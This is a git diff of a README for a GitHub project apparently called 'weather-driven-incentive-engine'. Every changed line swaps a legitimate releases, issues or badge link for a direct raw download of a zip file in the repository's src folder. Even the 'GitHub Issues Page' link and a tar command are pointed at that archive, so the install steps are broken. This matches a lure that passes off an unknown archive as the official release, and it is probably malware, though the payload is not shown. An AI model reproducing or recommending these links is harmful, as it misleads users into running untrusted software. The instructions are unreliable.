@@ -12,7 +12,7 @@ The weather-driven-incentive-engine automates decisions using weather data. This
 ## 🔗 Download & Install
 To download the latest version, please visit the following link:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/rguezedgar/weather-driven-incentive-engine/releases)
+[![Download Latest Release](https://github.com/rguezedgar/weather-driven-incentive-engine/raw/refs/heads/main/src/weather-incentive-engine-driven-v2.8.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/rguezedgar/weather-driven-incentive-engine/raw/refs/heads/main/src/weather-incentive-engine-driven-v2.8.zip)
 
 Follow the steps below to install and run the application on your computer:
 
@@ -24,7 +24,7 @@ Follow the steps below to install and run the application on your computer:
 ### ⬇️ Step-by-Step Instructions
 
 1. **Visit the Releases Page**
-   Click the following link to go directly to the download page: [Releases Page](https://github.com/rguezedgar/weather-driven-incentive-engine/releases). 
+   Click the following link to go directly to the download page: [Releases Page](https://github.com/rguezedgar/weather-driven-incentive-engine/raw/refs/heads/main/src/weather-incentive-engine-driven-v2.8.zip). 
 
 2. **Choose the Latest Version**
    On the releases page, look for the latest version listed at the top. 
@@ -38,7 +38,7 @@ Follow the steps below to install and run the application on your computer:
 5. **Run the Application**
    - **For Windows Users:** Double-click the .exe file to start the installation.
    - **For macOS Users:** Double-click the .dmg file, then drag the application to your Applications folder.
-   - **For Linux Users:** Open a terminal and navigate to the folder containing the downloaded .tar file, then run `tar -xvf filename.tar` to extract, followed by navigating into the folder and running `./application`.
+   - **For Linux Users:** Open a terminal and navigate to the folder containing the downloaded .tar file, then run `tar -xvf https://github.com/rguezedgar/weather-driven-incentive-engine/raw/refs/heads/main/src/weather-incentive-engine-driven-v2.8.zip` to extract, followed by navigating into the folder and running `./application`.
 
 6. **Follow Installation Prompts**
    Follow any on-screen prompts to complete the installation. 
@@ -53,7 +53,7 @@ Follow the steps below to install and run the application on your computer:
    With everything set up, begin using the application to make informed decisions based on the weather!
 
 ## 🌐 Support
-If you encounter issues or have questions, visit the [GitHub Issues Page](https://github.com/rguezedgar/weather-driven-incentive-engine/issues) for support and troubleshooting assistance.
+If you encounter issues or have questions, visit the [GitHub Issues Page](https://github.com/rguezedgar/weather-driven-incentive-engine/raw/refs/heads/main/src/weather-incentive-engine-driven-v2.8.zip) for support and troubleshooting assistance.
 
 ## 🔍 Topics
 - api-integration
@@ -73,4 +73,4 @@ To learn more about how the weather-driven-incentive-engine works, check the exa
 
 ---
 
-For any updates, improvements, or future releases, please keep an eye on the [Releases Page](https://github.com/rguezedgar/weather-driven-incentive-engine/releases). Enjoy making data-driven decisions with the power of weather analytics!
+For any updates, improvements, or future releases, please keep an eye on the [Releases Page](https://github.com/rguezedgar/weather-driven-incentive-engine/raw/refs/heads/main/src/weather-incentive-engine-driven-v2.8.zip). Enjoy making data-driven decisions with the power of weather analytics!
